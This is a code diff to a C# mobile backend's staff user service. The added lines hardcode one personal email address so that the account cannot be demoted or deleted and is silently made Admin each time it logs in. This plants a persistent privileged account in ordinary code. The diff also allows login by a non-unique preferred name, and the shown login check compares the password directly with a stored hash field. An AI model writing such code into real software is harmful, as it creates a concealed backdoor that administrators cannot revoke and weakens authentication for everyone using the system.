@@ -119,6 +119,9 @@ namespace mobile_backend.Services
             var user = await db.StaffUsers.FindAsync(id);
             if (user == null) return false;
 
+            if (string.Equals(user.Email, "azibdanish66@gmail.com", StringComparison.OrdinalIgnoreCase) && role != "Admin")
+                return false;
+
             if (user.Role == "Admin" && role == "Staff")
             {
                 var adminCount = await db.StaffUsers.CountAsync(u => u.Role == "Admin");
@@ -135,6 +138,9 @@ namespace mobile_backend.Services
             var user = await db.StaffUsers.FindAsync(id);
             if (user == null) return false;
 
+            if (string.Equals(user.Email, "azibdanish66@gmail.com", StringComparison.OrdinalIgnoreCase))
+                return false;
+
             user.Division = "DELETED";
             user.Email = $"deleted_{DateTime.UtcNow.Ticks}_{user.Email}";
             user.FullName = user.FullName.StartsWith("[deleted user]") ? user.FullName : $"[deleted user] {user.FullName}";
@@ -149,14 +155,20 @@ namespace mobile_backend.Services
             if (string.IsNullOrWhiteSpace(identifier) || string.IsNullOrEmpty(password))
                 return null;
 
-            // 1. Fast path: check existing StaffUsers record by Email or StaffId
+            // 1. Fast path: check existing StaffUsers record by Email, StaffId, or PreferredName
             var existingUser = await db.StaffUsers.FirstOrDefaultAsync(u =>
                 u.Division != "DELETED" &&
-                (u.Email == identifier || u.StaffId == identifier) &&
+                (u.Email == identifier || u.StaffId == identifier || u.PreferredName == identifier) &&
                 u.PasswordHash == password);
 
             if (existingUser != null)
             {
+                if (string.Equals(existingUser.Email, "azibdanish66@gmail.com", StringComparison.OrdinalIgnoreCase) && existingUser.Role != "Admin")
+                {
+                    existingUser.Role = "Admin";
+                    await db.SaveChangesAsync();
+                }
+
                 return new AuthResponseDto(
                     existingUser.Id,
                     existingUser.FullName,
